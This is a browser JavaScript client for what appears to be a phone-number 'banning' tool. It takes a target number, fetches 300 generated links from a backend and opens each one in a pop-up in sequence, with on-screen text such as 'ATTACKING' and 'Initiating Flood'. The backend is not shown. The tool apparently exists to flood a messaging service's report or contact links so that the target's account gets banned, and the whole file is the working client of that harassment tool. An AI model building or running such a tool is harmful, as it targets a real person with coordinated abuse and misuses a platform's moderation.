let isRunning = false;

async function launchBan() {
    const input = document.getElementById('phoneNumber');
    const statusText = document.getElementById('statusText');
    const countDisplay = document.getElementById('countDisplay');
    const timeDisplay = document.getElementById('timeDisplay');
    const logConsole = document.getElementById('logConsole');
    const btn = document.getElementById('startBtn');

    let phone = input.value.replace(/[^0-9]/g, ''); // Nettoyage du numéro
    if (!phone) {
        addLog("Error: Target number required.", 'error');
        return;
    }

    // Reset UI
    isRunning = true;
    let sentCount = 0;
    let totalTime = 180; 
    let currentSecond = totalTime;
    
    btn.disabled = true;
    btn.innerText = "BANNING IN PROGRESS...";
    statusText.innerText = "ATTACKING";
    statusText.style.color = "#ff003c";
    
    addLog(`Fetching 300 unique links for ${phone}...`, 'normal');

    try {
        // 1. Récupérer les liens depuis notre Node.js
        const response = await fetch(`/api/generate?phone=${phone}`);
        const data = await response.json();
        
        if (!data.links || data.links.length === 0) throw new Error("No links generated");

        addLog("Links acquired. Initiating Flood...", 'success');

        // 2. Lancer le timer visuel
        const timerInterval = setInterval(() => {
            currentSecond--;
            let m = Math.floor(currentSecond / 60);
            let s = currentSecond % 60;
            timeDisplay.innerText = `${m < 10 ? '0'+m : m}:${s < 10 ? '0'+s : s}`;

            if (currentSecond <= 0) {
                clearInterval(timerInterval);
                finishBan();
            }
        }, 1000);

        // 3. Ouvrir les fenêtres (Flood)
        // On ouvre 300 fenêtres. Pour éviter que le navigateur bloque tout, on fait des batches.
        for (let i = 0; i < data.links.length; i++) {
            const link = data.links[i];
            
            // Ouverture d'une petite fenêtre pop-up
            window.open(link, '_blank', 'width=400,height=600');
            
            sentCount++;
            countDisplay.innerText = `${sentCount} / 300`;
            addLog(`[+] Link ${i+1} Opened: ${link}`, 'normal');
            
            // Délai pour laisser le temps à l'OS de gérer les fenêtres
            await new Promise(r => setTimeout(r, 600)); 
        }

        clearInterval(timerInterval);
        finishBan();

    } catch (err) {
        addLog(`Critical Error: ${err.message}`, 'error');
        statusText.innerText = "FAILED";
        statusText.style.color = "red";
        btn.disabled = false;
        btn.innerText = "RETRY";
    }
}

function finishBan() {
    const statusText = document.getElementById('statusText');
    const btn = document.getElementById('startBtn');
    
    statusText.innerText = "COMPLETED";
    statusText.style.color = "#27c93f";
    btn.disabled = false;
    btn.innerText = "INITIATE BANNING SEQUENCE";
    
    addLog(`--------------------------------`, 'normal');
    addLog("[SUCCESS] Flood sequence completed. Check your windows!", 'success');
}

function addLog(message, type) {
    const consoleDiv = document.getElementById('logConsole');
    const line = document.createElement('div');
    line.innerText = message;
    if (type === 'error') line.classList.add('error');
    if (type === 'success') line.classList.add('success');
    consoleDiv.appendChild(line);
    consoleDiv.scrollTop = consoleDiv.scrollHeight;
}
